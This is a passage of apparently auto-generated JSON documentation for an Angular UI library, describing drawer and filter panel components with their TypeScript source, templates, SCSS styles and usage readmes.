                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "el",
                        "type": "ElementRef"
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef"
                    }
                ],
                "line": 178,
                "jsdoctags": [
                    {
                        "name": "el",
                        "type": "ElementRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit",
                "AfterViewInit"
            ],
            "accessors": {
                "open": {
                    "name": "open",
                    "setSignature": {
                        "name": "open",
                        "type": "void",
                        "args": [
                            {
                                "name": "open",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 84,
                        "jsdoctags": [
                            {
                                "name": "open",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "slideInOut": {
                    "name": "slideInOut",
                    "getSignature": {
                        "name": "slideInOut",
                        "type": "",
                        "returnType": "",
                        "line": 91
                    }
                }
            },
            "readme": "<h3 id=\"sto-drawer\">Sto Drawer</h3>\n<p>A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.</p>\n<p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-header\">sto-filter-header</h5>\n<p>Content (HTML) that is inside the header of the drawer.  </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-header&gt;\n        &lt;h3&gt;Price&lt;/h3&gt;\n        &lt;div class=&quot;sto-drawer__header__suffix&quot;&gt;\n            &lt;button type=&quot;button&quot;\n                    mat-icon-button\n                    (click)=&quot;cancel()&quot;&gt;\n                &lt;mat-icon&gt;close&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/sto-drawer-header&gt;</code></pre></div><h5 id=\"sto-drawer__footer\">sto-drawer__footer</h5>\n<p>Content (HTML) that is inside the header footer.  </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer&gt;\n        &lt;mat-progress-bar class=&quot;sto-progress-bar&quot; mode=&quot;indeterminate&quot; *ngIf=&quot;!hasData || (isLoading$ | async)&quot;&gt;&lt;/mat-progress-bar&gt;\n        &lt;button mat-raised-button (click)=&quot;save()&quot; color=&quot;primary&quot;&gt;Save&lt;/button&gt;\n        &lt;button mat-button (click)=&quot;cancel(true)&quot; color=&quot;primary&quot;&gt;Cancel&lt;/button&gt;\n&lt;/sto-drawer-footer&gt;</code></pre></div><p>####Input </p>\n<h5 id=\"offset\">offset</h5>\n<p>Offset (space) between the viewPanel right and the drawer in pixels. Binds to the right style property.\nUsed for multiple drawers where the offset would be the width of the already opened drawer.\nDefault 0.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer offset=&quot;32px&quot;&gt;</code></pre></div><h5 id=\"padding\">padding</h5>\n<p>Offset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\n Default 0.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer padding=&quot;16px&quot;&gt;</code></pre></div><h5 id=\"position\">position</h5>\n<p>Position of the drawer as a string\nLeft or right. Default right.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer position=&quot;left&quot;&gt;</code></pre></div><h5 id=\"cssclass\">cssClass</h5>\n<p>Additional css class(es) as a string e.g &quot;sto-drawer--xmas&quot;.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer cssClass=&quot;sto-drawer--xmas&quot;&gt;</code></pre></div><h5 id=\"closeonclick\">closeOnClick</h5>\n<p>If the drawer should close when clicked outside the drawer.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [closeOnClick]=&quot;false&quot;&gt;</code></pre></div><h5 id=\"ignoreesckey\">ignoreEscKey</h5>\n<p>Esc key closed by default the drawer, this overrides that behaviour.\nDefault false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [ignoreEscKey]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"open\">open</h5>\n<p>If the drawer is opened.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [open]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"width\">width</h5>\n<p>The width of the drawer in as a string (pixels: &#39;600px&#39;, presentage: &#39;33%&#39;, or viewPort:&#39;30vw&#39;)\nDefault &#39;25vw&#39;</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer width=&quot;320px&quot;&gt;</code></pre></div><p>####Output </p>\n<h5 id=\"ontoggle\">onToggle</h5>\n<p>Emits true if opened, false if closed.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onToggle)=&quot;onToggle($event)&quot;&gt;</code></pre></div><h5 id=\"onclose\">onClose</h5>\n<p>Emits on close.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onClose)=&quot;onClose()&quot;&gt;</code></pre></div><h5 id=\"onopen\">onOpen</h5>\n<p>Emits on open.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onOpen)=&quot;onOpen()&quot;&gt;</code></pre></div><h5 id=\"cancel\">cancel</h5>\n<p>Emits on cancel. When the cancel is called by pressing ESC key.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (cancel)=&quot;onCancel()&quot;&gt;</code></pre></div><h5 id=\"submit\">submit</h5>\n<p>Emits on submit. When the submit is called from code like CTRL+S.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (submit)=&quot;onSubmit()&quot;&gt;</code></pre></div>",
            "templateData": "<div\n  [ngClass]=\"position + ' ' + cssClass\"\n  [style.width]=\"width\"\n  [style.top]=\"padding\"\n  [style.zIndex]=\"position === 'left' ? 60 : 58\"\n  [style.right]=\"offset\"\n  [@drawerAnimations]=\"slideInOut\"\n  class=\"sto-drawer\">\n  <div class=\"sto-drawer__header__wrapper\"\n       #header>\n    <ng-content select=\"sto-drawer-header\">\n    </ng-content>\n  </div>\n  <div [class.navigation]=\"!header\"\n       [style.height]=\"height\"\n       class=\"sto-drawer__content\">\n    <ng-content></ng-content>\n  </div>\n\n  <div class=\"sto-drawer__footer\"\n       [style.display]=\"footer ? 'inherit' : 'none'\"\n       #footerEl>\n    <ng-content select=\"sto-drawer-footer\"></ng-content>\n  </div>\n\n</div>\n\n<div @overlay\n     class=\"sto-drawer__overlay\"\n     [style.left]=\"0\"\n     *ngIf=\"open && animation && backdrop\"\n     (click)=\"closeDrawer()\"></div>\n"
        },
        {
            "name": "StoDrawerFooterComponent",
            "id": "component-StoDrawerFooterComponent-cfebc3081447140ddfe3c8f30ed5fe3d",
            "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-footer.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-drawer-footer",
            "styleUrls": [],
            "styles": [],
            "template": "<ng-content></ng-content>",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'sto-drawer-footer',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDrawerFooterComponent {\n}\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": ""
        },
        {
            "name": "StoDrawerHeaderComponent",
            "id": "component-StoDrawerHeaderComponent-6b079dab9a766ec998699dc814d9ecaa",
            "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-header.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-drawer-header",
            "styleUrls": [
                "./sto-drawer.component.scss"
            ],
            "styles": [],
            "template": "<ng-content></ng-content>",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-drawer__header",
                    "defaultValue": "true",
                    "line": 10
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, HostBinding } from '@angular/core';\n\n@Component({\n  selector: 'sto-drawer-header',\n  template: `\n    <ng-content></ng-content>`,\n  styleUrls: [ './sto-drawer.component.scss' ]\n})\nexport class StoDrawerHeaderComponent {\n  @HostBinding('class.sto-drawer__header') class = true;\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "@use '~@angular/material' as mat;\n\n\n\n$header-height: 74px;\n$large-header-height: 24 * 4px;\n$footer-height: 16 * 4px;\n$header-size: 20px;\n.large-header {\n  .sto-drawer__content {\n    height: calc(100% - calc(#{$large-header-height} + #{$footer-height}));\n  }\n\n  .sto-drawer__header {\n    line-height: 30px;\n    height: $large-header-height;\n  }\n}\n\n\n\n.sto-drawer {\n  transition: right 400ms ease-in-out;\n  @include mat.elevation(16);\n  position: fixed;\n  top: 0;\n  bottom: 0;\n  width: 20%;\n  min-width: 260px;\n  padding-top: $header-height;\n\n  &.right {\n    min-width: 450px;\n  }\n\n  z-index: 30;\n\n  &.right {\n    left: auto;\n    right: 0;\n  }\n\n  &.left {\n    left: 0;\n    right: auto;\n  }\n\n  &__content {\n    padding: 2 * 4px;\n    overflow-y: auto;\n    overflow-x: hidden;\n\n    &.navigation {\n      height: 100%;\n    }\n  }\n\n  &__footer {\n    @include mat.elevation(4);\n    position: absolute;\n    bottom: 0;\n    left: 0;\n    padding: 2 * 4px;\n    width: 100%;\n\n    height: calc(#{$footer-height} - 4 * 4px);\n\n    button {\n      text-transform: uppercase;\n    }\n\n    &__more {\n      float: right;\n    }\n  }\n\n  &__header {\n    display: flex;\n    align-items: center;\n    width: 100%;\n\n    .sto-main-icon {\n      height: 40px;\n      width: 40px;\n      margin: 6px 0 0 16px;\n    }\n\n    &__title, h1, h2, h3, h4 {\n      margin: 0;\n      padding-left: 16px;\n    }\n\n    &__suffix {\n      width: 100%;\n      text-align: right;\n      min-width: 56px;\n      //color: $white-87;\n    }\n\n    &__infix {\n      min-width: 56px;\n\n      //color: $white;\n    }\n\n    button.mat-icon-button {\n      margin: 0 8px;\n      border: 0;\n      outline: none;\n      cursor: pointer;\n\n    }\n\n    &__wrapper {\n      @include mat.elevation(4);\n      position: absolute;\n      top: 0;\n      z-index: 1;\n      padding: 0;\n      display: flex;\n      box-sizing: border-box;\n      width: 100%;\n      height: $header-height;\n      flex-direction: row;\n      align-items: center;\n      white-space: nowrap;\n\n    }\n  }\n}\n\n.large-header {\n  .sto-drawer {\n    padding-top: $large-header-height;\n  }\n}\n\n.sto-navigation{\n  .mat-list {\n    .mat-subheader {\n      padding: 8px;\n    }\n  }\n}\n\n.sto-drawer__overlay {\n  position: fixed;\n  top: 0;\n  height: 100vh;\n  width: 100vw;\n  z-index: 57;\n  opacity: 0.08;\n}\n\n@import \"sto-drawer-tabs.component\";\n",
                    "styleUrl": "./sto-drawer.component.scss"
                }
            ],
            "stylesData": ""
        },
        {
            "name": "StoDrawerWrapperComponent",
            "id": "component-StoDrawerWrapperComponent-441b2130d828ad06c675e01f650b9243",
            "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-wrapper.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-drawer-wrapper",
            "styleUrls": [
                "./sto-drawer-wrapper.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-drawer-wrapper.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'sto-drawer-wrapper',\n  templateUrl: './sto-drawer-wrapper.component.html',\n  styleUrls: [ './sto-drawer-wrapper.component.scss' ]\n})\nexport class StoDrawerWrapperComponent {\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ":host {\n  position: relative;\n  transform: translate3d(0,0,0);\n}\ndiv.wrapper {\n  margin: 5px 0px;\n  display: block;\n}\ndiv.content {\n  display: block;\n}",
                    "styleUrl": "./sto-drawer-wrapper.component.scss"
                }
            ],
            "stylesData": "",
            "templateData": "<div class=\"wrapper\">\n\t<ng-content select=\"sto-sidebar\"></ng-content>\n\t<div class=\"content\">\n\t\t<ng-content></ng-content>\n\t</div>\n</div>"
        },
        {
            "name": "StoFilterActionsBar",
            "id": "component-StoFilterActionsBar-21ad8ac77646e700e5df7422a50d8008",
            "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-filter-actions-bar",
            "styleUrls": [],
            "styles": [],
            "template": "<ng-content></ng-content>\n<mat-button-toggle class=\"icon\"\n                   *ngIf=\"expandable\"\n                   style=\"box-shadow:none\"\n                   [checked]=\"expanded\"\n                   (change)=\"onChange($event)\"\n                   title=\"Toggle filter panel\"\n                   (click)=\"toggle.emit()\">\n    <mat-icon>filter_list</mat-icon>\n</mat-button-toggle>\n\n",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "expandable",
                    "line": 212,
                    "type": "boolean"
                },
                {
                    "name": "expanded",
                    "line": 204,
                    "type": "boolean"
                }
            ],
            "outputsClass": [
                {
                    "name": "toggle",
                    "defaultValue": "new EventEmitter<void>()",
                    "line": 215,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_expanded",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 213,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "onChange",
                    "args": [
                        {
                            "name": "event",
                            "type": "unknown"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 218,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "unknown",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [
                {
                    "name": "class.sto-filter-actions",
                    "defaultValue": "true",
                    "line": 202
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n      <ng-content></ng-content>\n      <mat-button-toggle class=\"icon\"\n                         *ngIf=\"expandable\"\n                         style=\"box-shadow:none\"\n                         [checked]=\"expanded\"\n                         (change)=\"onChange($event)\"\n                         title=\"Toggle filter panel\"\n                         (click)=\"toggle.emit()\">\n          <mat-icon>filter_list</mat-icon>\n      </mat-button-toggle>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": "",
            "accessors": {
                "expanded": {
                    "name": "expanded",
                    "setSignature": {
                        "name": "expanded",
                        "type": "void",
                        "args": [
                            {
                                "name": "expanded",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 204,
                        "jsdoctags": [
                            {
                                "name": "expanded",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "expanded",
                        "type": "boolean",
                        "returnType": "boolean",
                        "line": 208
                    }
                }
            },
            "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
        },
        {
            "name": "StoFilterPanelComponent",
            "id": "component-StoFilterPanelComponent-21ad8ac77646e700e5df7422a50d8008",
            "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-filter-panel",
            "styleUrls": [
                "./sto-filter-panel.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-filter-panel.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "expandable",
                    "defaultValue": "true",
                    "description": "<p>If the filter panel should be expandable. Default true.</p>\n",
                    "line": 40
                },
                {
                    "name": "expanded",
                    "description": "<p>If the filter panel should be expanded by default. Default false.</p>\n",
                    "line": 46,
                    "type": "boolean"
                },
                {
                    "name": "filterList",
                    "description": "<p>List of active filters.</p>\n",
                    "line": 52,
                    "type": "FilterList[]"
                },
                {
                    "name": "host",
                    "line": 78,
                    "type": "FilterForm<Record<string, unknown>>"
                }
            ],
            "outputsClass": [
                {
                    "name": "clearFilter",
                    "defaultValue": "new EventEmitter()",
                    "description": "<p>Emits when a filter should be cleared (if applicable)</p>\n",
                    "line": 65,
                    "type": "EventEmitter"
                },
                {
                    "name": "toggled",
                    "defaultValue": "new EventEmitter<{ isExpanded: boolean, contentHeight: number }>()",
                    "description": "<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content i pixels.\n  {EventEmitter&lt;{isExpanded: boolean, contentHeight: number }&gt;}</p>\n",
                    "line": 60,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_contentHeight",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 79,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "contentWrapper",
                    "type": "literal type",
                    "optional": false,
                    "description": "<p>Buttons and actions on the left side of the separator if both table and filter actions is present.</p>\n",
                    "line": 70,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'tableActions'"
                        }
                    ]
                },
                {
                    "name": "contentWrapper2",
                    "type": "literal type",
                    "optional": false,
                    "description": "<p>Buttons and actions on the right side of the separator if both table and filter actions is present.</p>\n",
                    "line": 74,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'filterActions'"
                        }
                    ]
                },
                {
                    "name": "filterForm",
                    "type": "literal type",
                    "optional": false,
                    "description": "",
                    "line": 75,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'filterForm'"
                        }
                    ]
                },
                {
                    "name": "hasSeperator",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 81,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "_clearFilter",
                    "args": [
                        {
                            "name": "key",
                            "type": "string"
                        },
                        {
                            "name": "index",
                            "type": "number",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 144,
                    "jsdoctags": [
                        {
                            "name": "key",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "index",
                            "type": "number",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "needSeperator",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 125,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 112
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 100
                },
                {
                    "name": "setContentHeight",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 117,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "toggle",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 94,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "<p>Sto filter panel is an extension of mat-accordion</p>\n",
            "rawdescription": "Sto filter panel is an extension of mat-accordion",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight 